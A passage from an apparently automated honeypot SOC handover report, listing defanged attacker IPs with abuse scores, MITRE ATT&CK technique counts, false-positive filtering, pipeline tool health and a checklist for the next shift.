| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `73.72.45[.]69` | US | Comcast IP Services, L.L.C. | **100** ⚠️ | 0 |
| `187.94.255[.]130` | BR | VITAL NET | **100** ⚠️ | 50 |
| `101.126.55[.]67` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `106.251.244[.]178` | KR | LG DACOM Corporation | **100** ⚠️ | 50 |
| `119.91.19[.]185` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 5 |
| `180.76.233[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 16 |
| `14.103.117[.]105` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 88 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 35 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 33 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 18 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 136 cases |
| Tool 34  | Credential Extractor        | ✅ 68 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (8.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 35 priority case(s) shown individually · 12 recon entry/entries in table (5 group(s) consolidating 82 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-14T19:55:32Z_
